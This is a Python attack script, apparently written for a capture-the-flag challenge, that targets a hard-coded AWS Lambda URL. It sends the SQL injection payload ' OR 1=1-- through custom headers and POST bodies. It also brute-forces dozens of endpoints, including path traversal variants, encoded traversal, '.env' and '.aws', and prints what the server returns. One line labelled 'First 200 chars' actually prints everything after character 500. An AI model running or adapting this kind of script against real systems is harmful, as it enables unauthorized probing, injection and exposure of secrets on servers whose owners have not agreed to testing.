import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import time

def test_headers(url):
    headers = {
        # Try sanitizer-related headers
        'X-Sanitizer': 'true',
        'X-Min': 'true',
        'X-Wait': 'true',
        'X-Special': 'true',
        # Try SQL injection in headers
        'X-Query': "' OR 1=1--",
        # Try to manipulate content type
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        # Try custom headers
        'X-Menu-Type': 'special',
        'X-CSC-Shop': 'true'
    }
    
    for header_name, header_value in headers.items():
        try:
            response = requests.post(url, 
                                  headers={'Content-Type': 'application/x-www-form-urlencoded',
                                         header_name: header_value}, 
                                  data={'query': "' OR 1=1--"})
            print(f"\nTesting header: {header_name}: {header_value}")
            print(f"Status: {response.status_code}")
            print(f"Response length: {len(response.text)}")
        except Exception as e:
            print(f"Error with {header_name}: {str(e)}")

def send_request(url, method='GET', data=None):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers, timeout=5)
        else:
            response = requests.post(url, headers=headers, data=data, timeout=5)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error for {url}: {str(e)}")
        return None

def test_endpoint(base_url, endpoint):
    # Test GET request
    url = f"{base_url}/{endpoint}"
    print(f"\nTesting GET {url}")
    response = send_request(url)
    if response:
        print(f"Status: {response.status_code}")
        if response.status_code != 404:
            print(f"Content length: {len(response.text)}")
            print("First 200 chars of response:", response.text[:200])

    # Test POST request with SQL injection
    print(f"\nTesting POST {url}")
    data = {'query': "' OR 1=1--"}
    response = send_request(url, 'POST', data)
    if response:
        print(f"Status: {response.status_code}")
        if response.status_code != 404:
            print(f"Content length: {len(response.text)}")
            print("First 200 chars of response:", response.text[500:])

def main():
    base_url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws"
    
    # Common endpoints to test
    endpoints = [
        '',  # Root
        'menu',
        'admin',
        'api',
        'api/menu',
        'api/admin',
        'api/items',
        'dashboard',
        'login',
        'special',
        'sanitizer',
        'min',
        'secret',
        'flag',
        '../menu',  # Path traversal attempts
        '../../menu',
        'menu/',
        'menu/special',
        'menu/admin',
        'menu/items',
        '.env',  # Common files
        'robots.txt',
        'sitemap.xml',
        'swagger.json',
        'api-docs',
        
        # Variations based on challenge hints
        'sanitizer-menu',
        'special-menu',
        'min-menu',
        'wait',
        'paws',
        
        # Lambda-specific paths
        '.aws',
        'lambda',
        'function',
        
        # Try some encoded versions
        urllib.parse.quote('../menu'),
        urllib.parse.quote('../../menu'),
        '%2e%2e/menu',
        '%2e%2e/%2e%2e/menu',
        
        # Try some case variations
        'Menu',
        'MENU',
        'Admin',
        'ADMIN',
        
        # Try some special characters
        'menu#',
        'menu?',
        'menu;',
        'menu.php',
        'menu.json',
        
        # Try some combinations
        'api/v1/menu',
        'api/v1/items',
        'api/v1/special',
        'api/v1/sanitizer'
    ]

    print("Starting endpoint discovery...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for endpoint in endpoints:
            executor.submit(test_endpoint, base_url, endpoint)
            time.sleep(0.5)  # Be nice to the server

if __name__ == "__main__":
    main()